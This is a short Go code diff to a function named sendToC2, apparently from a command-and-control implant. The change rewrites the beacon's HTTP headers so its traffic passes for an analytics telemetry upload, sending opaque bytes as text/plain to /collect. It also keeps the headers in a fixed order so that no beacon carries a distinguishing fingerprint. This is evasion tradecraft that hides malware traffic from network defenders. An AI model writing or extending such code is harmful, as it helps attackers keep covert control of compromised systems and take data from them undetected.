@@ -74,13 +74,14 @@ func sendToC2(idx int, body []byte) []byte {
 	if err != nil {
 		return nil
 	}
-	// Baseline browser-like headers in fixed canonical order so every
-	// beacon emits the identical sequence (map iteration order would be a
-	// per-beacon fingerprint). Profile headers below apply in sorted-key
-	// order and may override any baseline, including Content-Type/UA.
-	req.Header.Set("Content-Type", "application/json")
+	// Analytics-mimic baseline in fixed canonical order so every beacon
+	// emits the identical sequence (map iteration order would be a
+	// per-beacon fingerprint): opaque bytes as text/plain POSTed to /collect,
+	// like an analytics telemetry upload. Profile headers below apply in
+	// sorted-key order and may override any baseline, including Content-Type/UA.
+	req.Header.Set("Content-Type", "text/plain;charset=UTF-8")
 	req.Header.Set("User-Agent", getActiveUserAgentFromConfig())
-	req.Header.Set("Accept", "application/json, text/plain, */*")
+	req.Header.Set("Accept", "*/*")
 	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
 	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
 	req.Header.Set("Connection", "keep-alive")
